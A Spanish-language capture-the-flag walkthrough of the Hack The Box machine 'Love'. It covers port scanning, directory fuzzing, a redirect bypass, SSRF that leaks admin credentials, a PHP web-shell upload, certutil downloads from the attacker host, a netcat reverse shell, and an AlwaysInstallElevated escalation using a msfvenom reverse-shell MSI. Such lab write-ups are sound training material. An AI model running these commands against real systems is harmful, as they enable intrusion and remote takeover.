# LOVE

## Reconocimiento

### Nmap
Lo primero que haremos será enumerar los puertos abiertos en la máquina víctima, para ello usaremos [nmap](https://github.com/nmap/nmap), al que le indicaremos que queremos filtrar el rango de puertos completo, que solo nos muestre los puertos que estén abiertos y que usaremos el método de enumeración TCP Syn Port Scan. Opcionalmente se pueden desactivar el descubrimiento de hosts y la resolución DNS para agilizar el escaneo. Por último, exportaremos las evidencias al fichero allPorts:

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn -oG allPorts 10.10.10.239
```

```bash
File: allPorts


# Nmap 7.91 scan initiated Mon Jul 26 23:54:07 2021 as: nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn -oG allPorts 10.10.10.239
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.10.10.239 ()	Status: Up
Host: 10.10.10.239 ()	Ports: 80/open/tcp//http///, 135/open/tcp//msrpc///, 139/open/tcp//netbios-ssn///, 443/open/tcp//https///, 445/open/tcp//microsoft-ds///, 3306/open/tcp//mysql///, 5000/open/tcp//upnp///, 5040/open/tcp//unknown///, 5985/open/tcp//wsman///, 5986/open/tcp//wsmans///, 7680/open/tcp//pando-pub///, 47001/open/tcp//winrm///, 49664/open/tcp/////, 49665/open/tcp/////, 49666/open/tcp/////, 49667/open/tcp/////, 49668/open/tcp/////, 49669/open/tcp/////, 49670/open/tcp/////
# Nmap done at Mon Jul 26 23:54:23 2021 -- 1 IP address (1 host up) scanned in 16.19 seconds
```

<br>

Efectuaremos un escaneo más exhaustivo para ver los servicios y versiones que corren bajo estos puertos abiertos, exportaremos las evidencias al fichero targeted:

```bash
nmap -sC -sV -p80,135,139,443,445,3306,5000,5040,5985,5986,7680,47001,49664,49665,49666,49667,49668,49669,49670 -oN targeted 10.10.10.239
```

```bash
File: targeted


# Nmap 7.91 scan initiated Mon Jul 26 23:55:04 2021 as: nmap -sC -sV -p80,135,139,443,445,3306,5000,5040,5985,5986,7680,47001,49664,49665,49666,49667,49668,49669,49670 -oN targeted 10.10.10.239
Nmap scan report for 10.10.10.239
Host is up (0.045s latency).

PORT      STATE SERVICE      VERSION
80/tcp    open  http         Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
|_http-title: Voting System using PHP
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
443/tcp   open  ssl/http     Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
|_http-title: 403 Forbidden
| ssl-cert: Subject: commonName=staging.love.htb/organizationName=ValentineCorp/stateOrProvinceName=m/countryName=in
| Not valid before: 2021-01-18T14:00:16
|_Not valid after:  2022-01-18T14:00:16
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
445/tcp   open  microsoft-ds Windows 10 Pro 19042 microsoft-ds (workgroup: WORKGROUP)
3306/tcp  open  mysql?
| fingerprint-strings: 
|   FourOhFourRequest, Kerberos: 
|_    Host '10.10.14.248' is not allowed to connect to this MariaDB server
5000/tcp  open  http         Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
|_http-title: 403 Forbidden
5040/tcp  open  unknown
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
5986/tcp  open  ssl/http     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
| ssl-cert: Subject: commonName=LOVE
| Subject Alternative Name: DNS:LOVE, DNS:Love
| Not valid before: 2021-04-11T14:39:19
|_Not valid after:  2024-04-10T14:39:19
|_ssl-date: 2021-07-26T22:32:35+00:00; +34m34s from scanner time.
| tls-alpn: 
|_  http/1.1
7680/tcp  open  pando-pub?
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49669/tcp open  msrpc        Microsoft Windows RPC
49670/tcp open  msrpc        Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3306-TCP:V=7.91%I=7%D=7/26%Time=60FF2F47%P=x86_64-pc-linux-gnu%r(Ke
SF:rberos,4B,"G\0\0\x01\xffj\x04Host\x20'10\.10\.14\.248'\x20is\x20not\x20
SF:allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(FourOhF
SF:ourRequest,4B,"G\0\0\x01\xffj\x04Host\x20'10\.10\.14\.248'\x20is\x20not
SF:\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server");
Service Info: Hosts: www.example.com, LOVE, www.love.htb; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h19m34s, deviation: 3h30m01s, median: 34m33s
| smb-os-discovery: 
|   OS: Windows 10 Pro 19042 (Windows 10 Pro 6.3)
|   OS CPE: cpe:/o:microsoft:windows_10::-
|   Computer name: Love
|   NetBIOS computer name: LOVE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2021-07-26T15:32:20-07:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-07-26T22:32:21
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Jul 26 23:58:02 2021 -- 1 IP address (1 host up) scanned in 177.83 seconds
```

<br>

Como vemos, tenemos una gran cantidad de puertos abiertos, por lo que procederemos a enumerarlos por orden.

<br>

### Servidor web
Comenzaremos enumerando el servidor web que corre en el puerto 80. Lo primero que haremos será visualizarlo en el navegador:

<img src="https://i.imgur.com/9j57wJy.png" width=700>

Podemos ver que estamos ante una página de login, fijandonos en la URL veremos que nos encontramos ante un archivo index.php, esto nos hará pensar en que el servidor web del puerto 80 está construido en PHP, cosa que tendremos en cuenta.

Ya que no contamos con credenciales de usuario procederemos a fuzzear el servidor web en busca de posibles directorios. Para ello usaremos [wfuzz](https://github.com/xmendez/wfuzz) junto al diccionario **directory-list-2.3-medium.txt** de Dirbuster:

```bash
wfuzz -c --hc=404 -f fuzzRoot,raw -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.239/FUZZ
```

```bash
File: fuzzRoot


Target: http://10.10.10.239/FUZZ
Total requests: 220560
==================================================================
ID    Response   Lines      Word         Chars          Request    
==================================================================
00001:  C=200    125 L	     324 W	   4388 Ch	  "# directory-list-2.3-medium.txt"
00006:  C=200    125 L	     324 W	   4388 Ch	  "# Attribution-Share Alike 3.0 License. To view a copy of this"
00009:  C=200    125 L	     324 W	   4388 Ch	  "# Suite 300, San Francisco, California, 94105, USA."
00013:  C=200    125 L	     324 W	   4388 Ch	  "#"
00007:  C=200    125 L	     324 W	   4388 Ch	  "# license, visit http://creativecommons.org/licenses/by-sa/3.0/"
00004:  C=200    125 L	     324 W	   4388 Ch	  "#"
00002:  C=200    125 L	     324 W	   4388 Ch	  "#"
00003:  C=200    125 L	     324 W	   4388 Ch	  "# Copyright 2007 James Fisher"
00005:  C=200    125 L	     324 W	   4388 Ch	  "# This work is licensed under the Creative Commons"
00012:  C=200    125 L	     324 W	   4388 Ch	  "# on atleast 2 different hosts"
00010:  C=200    125 L	     324 W	   4388 Ch	  "#"
00011:  C=200    125 L	     324 W	   4388 Ch	  "# Priority ordered case sensative list, where entries were found"
00016:  C=301      9 L	      30 W	    338 Ch	  "images"
00014:  C=200    125 L	     324 W	   4388 Ch	  "http://10.10.10.239/"
00008:  C=200    125 L	     324 W	   4388 Ch	  "# or send a letter to Creative Commons, 171 Second Street,"
00203:  C=301      9 L	      30 W	    338 Ch	  "Images"
00259:  C=301      9 L	      30 W	    337 Ch	  "admin"
00519:  C=301      9 L	      30 W	    339 Ch	  "plugins"
00638:  C=301      9 L	      30 W	    340 Ch	  "includes"
00902:  C=503     11 L	      44 W	    402 Ch	  "examples"

Total time: 0
Processed Requests: 1139
Filtered Requests: 1119
Requests/sec.: 0
```

<br> 

Tendremos unos cuantos directorios potenciales, veremos que hay un directorio llamado images, esto nos hace intuir que es el lugar donde se guardarán las imágenes del servidor web, lo tendremos en cuenta más adelante. Veremos otro directorio que nos llamará bastante la atención y este será el directorio admin. Procederemos a fuzzear archivos con extensión PHP en este directorio:

```bash
wfuzz -c --hc=404 -f fuzzAdminPHP,raw -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.239/admin/FUZZ.php
```

```bash
File: fuzzAdminPHP


Target: http://10.10.10.239/admin/FUZZ.php
Total requests: 220560
==================================================================
ID    Response   Lines      Word         Chars          Request    
==================================================================
00001:  C=200    169 L	     450 W	   6198 Ch	  "# directory-list-2.3-medium.txt"
00005:  C=200    169 L	     450 W	   6198 Ch	  "# This work is licensed under the Creative Commons"
00009:  C=200    169 L	     450 W	   6198 Ch	  "# Suite 300, San Francisco, California, 94105, USA."
00004:  C=200    169 L	     450 W	   6198 Ch	  "#"
00007:  C=200    169 L	     450 W	   6198 Ch	  "# license, visit http://creativecommons.org/licenses/by-sa/3.0/"
00006:  C=200    169 L	     450 W	   6198 Ch	  "# Attribution-Share Alike 3.0 License. To view a copy of this"
00002:  C=200    169 L	     450 W	   6198 Ch	  "#"
00003:  C=200    169 L	     450 W	   6198 Ch	  "# Copyright 2007 James Fisher"
00008:  C=200    169 L	     450 W	   6198 Ch	  "# or send a letter to Creative Commons, 171 Second Street,"
00010:  C=200    169 L	     450 W	   6198 Ch	  "#"
00011:  C=200    169 L	     450 W	   6198 Ch	  "# Priority ordered case sensative list, where entries were found"
00015:  C=200    169 L	     450 W	   6198 Ch	  "index"
00013:  C=200    169 L	     450 W	   6198 Ch	  "#"
00012:  C=200    169 L	     450 W	   6198 Ch	  "# on atleast 2 different hosts"
00038:  C=302    412 L	    1114 W	  16257 Ch	  "home"
00053:  C=302      0 L	       0 W	      0 Ch	  "login"
00142:  C=302      4 L	      47 W	    397 Ch	  "print"
00286:  C=302    412 L	    1114 W	  16257 Ch	  "Home"
00659:  C=200    169 L	     450 W	   6198 Ch	  "Index"
00825:  C=302      0 L	       0 W	      0 Ch	  "Login"
01225:  C=302      0 L	       0 W	      0 Ch	  "logout"
05085:  C=200    169 L	     450 W	   6198 Ch	  "INDEX"
05192:  C=302    490 L	    1277 W	  19800 Ch	  "positions"
05955:  C=302      4 L	      47 W	    397 Ch	  "Print"

Total time: 0
Processed Requests: 6975
Filtered Requests: 6951
Requests/sec.: 0
```

<br>

Veremos que tenemos varios archivos PHP, entre ellos: index, home, login o positions. Tendremos el archivo **index.php** que nos devuelve el código de estado 200, el resto de directorios tendrán el código de estado 302 y nos redirigirán al archivo index.php. 

<br>

### Método 1: Servidor web en el puerto 80. (302 to 200)
Podemos ver que tendremos varios archivos que nos devolverán un código de estado 302 Found. Investigaremos un poco más esto. Para ello nos dirigiremos a [Burpsuite](https://portswigger.net/burp/communitydownload) donde analizaremos las peticiones y las respuestas que se están tramitando en estos archivos. Empezaremos por intentar acceder al recurso home.php.

Como vemos, [Burpsuite](https://portswigger.net/burp/communitydownload) interceptará nuestra petición hacia el recurso home.php. Procederemos a interceptar también la respuesta que nos enviará el servidor web, para ello:

<img src="https://i.imgur.com/5DXzF5N.png" width=700>

Veremos que la respuesta del servidor tiene el código de estado 302 Found, también observaremos que tenemos presente código fuente del recurso home.php, por lo que procederemos a cambiar el código de estado 302 Found por el código de estado 200 Ok para ver si podemos visualizar la página:

<img src="https://i.imgur.com/2t5qmJb.png" width=700>

Después de este cambio la página web se visualizará correctamente y nos encontraremos ante un panel de administrador:

<img src="https://i.imgur.com/HDhC3PV.png" width=700>

En [Burpsuite](https://portswigger.net/burp/communitydownload) nos dirigiremos al apartado Proxy>Options>Match and Replace donde procederemos a filtrar este código de estado 302 y reemplazarlo por un código de estado 200, esto nos permitirá no tener que estar cambiandolo manualmente en las respuestas del servidor para visualizar correctamente la web:

<img src="https://i.imgur.com/wokookp.png" width=700>

<br>

### Método 2: Servidor web en el puerto 443 y SSRF (Server-Side Request Forgery)
Si nos fijamos en la enumeración que nos ha proporcionado [nmap](https://github.com/nmap/nmap), veremos que en el puerto 443 corre un servidor web HTTPs, pero que este es innacesible, también podemos ver que el certificado SSL nos filtra un dominio potencial. Este dominio será **staging.love.htb**, procederemos a añadirlo a nuestro archivo **/etc/hosts**, ya que podemos intuir que se está aplicando Virtual Hosting del lado del servidor. Si accedemos a este recurso desde el navegador:

<img src="https://i.imgur.com/B81N09i.png" width=700>

Si nos dirigimos a la pestaña demo: 

<img src="https://i.imgur.com/Ux313EM.png" width=700>

Podemos ver que es un servicio que nos permite compartir un archivo mediante una URL y que este sea escaneado en busca de malware.

Ya que estamos ante un panel en el que tenemos que insertar una URL, trataremos de listar recursos internos de la máquina mediante un SSRF (Server-Side Request Forgery). Para ello, apuntaremos a la dirección **localhost** (127.0.0.1).

Recordando la enumeración con [nmap](https://github.com/nmap/nmap), sabemos que en el puerto 5000 corre un servicio HTTP, pero que no tenemos permiso para visualizarlo.

Probaremos a visualizar el puerto abierto desde el escáner de URLs:

<img src="https://i.imgur.com/RbF9qPa.png" width=700>

Veremos que nos encontramos con las siguientes credenciales para el usuario admin:

```plaintext
File: webCreds


admin:@LoveIsInTheAir!!!!
```

<br>

Intentaremos conectarnos con estas credenciales al servidor web que corre en el puerto 80. Veremos que si intentamos conectarnos desde el panel de login principal (http://10.10.10.239/index.php) obtenemos que el usuario es incorrecto, por lo que trataremos de logearnos en el panel de login del directorio admin (http://10.10.10.239/admin/index.php). Veremos que en este caso las credenciales son correctas por lo que nos encontraremos en el panel de administradores de la página web.

<br>

## Shell de usuario

### Subida de archivo PHP malicioso
Nos dirigiremos a la pestaña voters, en la que podremos añadir votantes al servidor web. Procederemos a añadir un nuevo votante.

Como vemos tendremos que rellenar los campos nombre, apellido, contraseña e imagen, nos centraremos en este último ya que si conseguimos subir un archivo PHP en vez de una imagen y que se interprete en el servidor web, tendremos ejecución remota de comandos.

Lo primero que haremos será hacer una prueba con una imagen real: 

<img src="https://i.imgur.com/fFthOUy.png" width=700>

Interceptaremos esta petición con [Burpsuite](https://portswigger.net/burp/communitydownload) para ver como se están subiendo las imágenes al servidor web:

<img src="https://i.imgur.com/TZHUiBt.png" width=700>

Como vemos tendremos distintos campos delimitados en los datos de la petición. Nos centraremos en el que contiene la foto, será este el campo en el que intentaremos insertar código PHP.

Con el fin de bypassear algún tipo de filtro que pueda contener el servidor web para la subida fraudulenta de archivos, mantendremos la cabecera **Content-Type** como **image/jpeg**. El nombre del archivo lo cambiaremos por uno con extensión PHP y el contenido de la imagen la cambiaremos por código PHP que nos permita ejecutar comandos a nivel de sistema en la máquina víctima:

<img src="https://i.imgur.com/jEzrG68.png" width=700>

Recordando el proceso de fuzzing que le hemos aplicado al servidor web, contamos con un directorio **images**, este directorio podría ser en el que se encuentran las imágenes de los usuarios y en este caso nuestro código PHP, por lo que procederemos a examinarlo.

Nos encontraremos con nuestro archivo **test.php** por lo que procederemos a visualizarlo y comprobar si tenemos ejecución remota de comandos mediante el parámetro **cmd**:

<img src="https://i.imgur.com/SOkeAvd.png" width=700>

Veremos que tenemos ejecución remota de comandos como el usuario phoebe.

<br>

### Reverse shell
Trataremos de convertir esta web shell en una reverse shell. Lo primero que haremos será descargar el binario de [Netcat](http://netcat.sourceforge.net/) para Windows y montar un servidor HTTP que contenga el mismo. 

Desde el navegador procederemos a transferir el binario a la máquina víctima, para poder ejecutarlo y conseguir una reverse shell. Para ello usaremos **certutil.exe**:

```http
http://10.10.10.239/Images/test.php?cmd=certutil.exe%20-f%20-split%20-urlcache%20http://10.10.15.1/nc.exe
```

<img src="https://i.imgur.com/TrVtHqu.png" width=700>

Una vez tenemos el binario de [Netcat](http://netcat.sourceforge.net/) en la máquina víctima procederemos a enviarnos una reverse shell. Para ello, lo primero que haremos será ponernos en escucha por el puerto 443 en nuestra máquina:

```bash
nc -nlvp 443
```

En el navegador mediante el binario que acabamos de transferir:

```http
http://10.10.10.239/images/test.php?cmd=nc.exe%20-e%20cmd.exe%2010.10.15.1%20443
```

Obtendremos una reverse shell como el archivo phoebe:

<img src="https://i.imgur.com/GJs7fni.png" width=700>

Procederemos a leer la flag **user.txt** en el directorio **C:\Users\Phoebe\Desktop**.

<br>

## Shell de root

### Enumeración
En este punto, tendremos que enumerar la máquina víctima con el fin de escalar privilegios. Para ello usaremos el binario de [winPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS). 

Lo primero será comprobar la arquitectura y la versión de nuestra máquina víctima con el comando **systeminfo**:

<img src="https://i.imgur.com/a00ngUX.png" width=700>

Como vemos estamos ante una máquina de 64 bits por lo que usaremos el binario de [winPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS) para 64 bits.

Al igual que con el binario de [Netcat](http://netcat.sourceforge.net/) transferiremos el binario de [winPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS) a la máquina víctima:

```powershell
certutil.exe -f -split -urlcache http://10.10.15.1/winPEASx64.exe
```

Lo ejecutaremos exportando el resultado a un archivo:

```powershell
winPEASx64.exe > winPeas.txt
```

Comprobaremos el resultado de [winPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS) y nos encontraremos lo siguiente:

<img src="https://i.imgur.com/hIRkS1k.png" width=700>

Como vemos, [winPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS) nos sugiere explotar el permiso AlwaysInstallElevated. Este permiso permite a cualquier usuario instalar y ejecutar archivos con extensión **msi** como el usuario administrador.

Comprobaremos si tenemos estos permisos en la máquina víctima, para ello tendremos que consultar los siguientes valores del registro de Windows:

```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

<img src="https://i.imgur.com/BTHzDVH.png" width=700>

Podemos ver que tenemos ambos valores a 1 esto significa que podremos explotar este permiso.

<br>

### Archivo .msi  malicioso
Para explotar el permiso crearemos un archivo .msi con msfvenom que contendrá una TCP reverse shell:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.15.1 LPORT=9999 -f msi > 1.msi
```

<img src="https://i.imgur.com/9TDN2Vn.png" width=700>

Una vez tenemos el archivo .msi, lo transferiremos a la máquina víctima con **certutil.exe**:

<img src="https://i.imgur.com/8TTtmQK.png" width=600>

Procederemos a ponernos en escucha con [Netcat](http://netcat.sourceforge.net/) por el puerto 9999, para ello:

```bash
nc -nlvp 9999
```

Con el archivo msi en la máquina víctima procederemos a instalarlo y ejecutarlo con el comando:

```powershell
msiexec /quiet /qn /i 1.msi
```

Una vez ejecutado recibiremos una TCP reverse shell como el usuario **nt authority/system**:

<img src="https://i.imgur.com/VgWzNPM.png" width=700>

Visualizaremos la flag **root.txt** en el directorio **C:\Users\Administrator\Desktop**.